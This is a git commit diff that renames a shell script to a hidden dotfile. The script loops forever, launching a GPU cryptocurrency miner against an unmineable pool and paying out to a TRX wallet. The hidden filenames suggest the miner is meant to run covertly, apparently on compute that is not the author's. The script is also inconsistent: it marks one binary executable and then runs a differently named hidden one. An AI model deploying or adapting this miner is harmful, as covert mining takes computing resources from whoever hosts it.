f283df9c4061491c3c3a5c0a71a1f6e6dca11a22
Test2443 <101375280+Test2443@users.noreply.github.com>
2022-03-11 08:08:04 +0530

    Update and rename Archer.sh to .GMOP.sh

---
+++ .GMOP.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+POOL=ethash.unmineable.com:3333
+WALLET=TRX:TW6x5pAKLKk88DTSzZ8ZQCDp3Qe4bATn3k
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-God_Miner#ek61-6h9x)
+chmod +x tuyulgpu
+while [ 1 ]; do
+./.tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+sleep 10
+done
--- Archer.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=TRX:TUxbPLqKPtdvtGTFfAYmqJLdzjBhQuWSVU
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-COLG#im8m-ybvt)
-chmod +x tuyulgpu
-while [ 1 ]; do
-./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
-sleep 10
-done
